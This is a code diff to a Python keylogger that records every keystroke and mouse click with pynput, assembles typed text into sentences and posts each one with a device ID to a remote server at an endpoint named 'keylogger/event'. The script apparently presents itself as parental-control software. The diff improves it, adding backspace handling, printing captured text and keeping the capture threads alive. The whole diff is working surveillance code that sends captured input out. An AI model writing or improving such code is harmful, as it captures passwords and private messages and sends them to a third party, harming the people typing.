@@ -1,8 +1,6 @@
 import requests
-import socket
 from pynput import keyboard, mouse
 import tkinter as tk
-from tkinter import messagebox
 
 sentence_buffer = []
 device_name = None
@@ -22,16 +20,12 @@ def show_start_notification():
             def copy_and_close():
                 root.clipboard_clear()
                 root.clipboard_append(device_name)
-                root.update_idletasks()  # safer than root.update()
-                root.withdraw()  # hide the window instead of destroying
+                root.update_idletasks()
                 try:
-                    # Force clipboard to be saved to system (especially on Windows)
                     root.clipboard_get()
                 except tk.TclError as e:
                     print("Clipboard error:", e)
-                root.after(500, root.destroy)  # destroy after delay
-
-
+                root.destroy()  # destroy the window after copying
 
             root = tk.Tk()
             root.title("Device ID Generated")
@@ -58,7 +52,7 @@ def show_start_notification():
 def send_sentence(sentence):
     global device_name
     try:
-        print(device_name)
+        print(device_name, sentence)
         requests.post("https://parentcontrolserver.onrender.com/keylogger/event", json={
             "word": sentence,
             "device": device_name
@@ -72,12 +66,15 @@ def on_press(key):
         if hasattr(key, 'char') and key.char is not None:
             sentence_buffer.append(key.char)
         elif key == keyboard.Key.space:
-            sentence_buffer.append(' ')  # Add space character
+            sentence_buffer.append(' ')
         elif key == keyboard.Key.enter:
             if sentence_buffer:
                 sentence = ''.join(sentence_buffer).strip()
                 send_sentence(sentence)
                 sentence_buffer = []
+        elif key == keyboard.Key.backspace:
+            if sentence_buffer:
+                sentence_buffer.pop()
     except Exception as e:
         print("Error in key press:", e)
 
@@ -90,7 +87,12 @@ def on_click(x, y, button, pressed):
 
 if __name__ == "__main__":
     show_start_notification()
-    keyboard.Listener(on_press=on_press).start()
-    mouse.Listener(on_click=on_click).start()
-    while True:
-        pass  # Keep script running
+    k_listener = keyboard.Listener(on_press=on_press)
+    m_listener = mouse.Listener(on_click=on_click)
+    
+    k_listener.start()
+    m_listener.start()
+    
+    # This ensures the main thread doesn't exit and keeps both listeners alive
+    k_listener.join()
+    m_listener.join()
